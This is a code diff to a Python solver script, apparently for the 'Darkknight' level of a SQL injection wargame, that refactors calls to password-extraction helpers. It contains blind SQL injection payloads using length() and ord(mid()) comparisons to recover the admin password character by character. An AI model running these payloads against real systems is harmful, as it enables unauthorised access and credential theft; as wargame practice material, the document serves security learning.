@@ -4,6 +4,10 @@ import los
 from getpass import getpass
 
 
+def check_func(response: str) -> bool:
+    return 'Hello admin' in response
+
+
 def main():
     '''
     Darkknight
@@ -36,13 +40,15 @@ def main():
         exit(1)
 
     payload = "0||length(pw)>%s&&id like 0x61646d696e#"
-    len_of_key = los.find_key_len(url, payload, 'no', 'Hello admin', cook)
+    param = dict(no=payload)
+    len_of_key = los.find_key_len(url, param, check_func, cook)
 
     print(len_of_key)
 
     payload = "0||id like 0x61646d696e&&ord(mid(pw,%s,1))%s#"
-    result = los.find_binary(url, payload,
-                             'no', 'Hello admin', 32, 127, len_of_key, cook)
+    param = dict(no=payload)
+    result = los.find_binary(url, param, check_func,
+                             32, 127, len_of_key, cook)
 
     print(result)
 
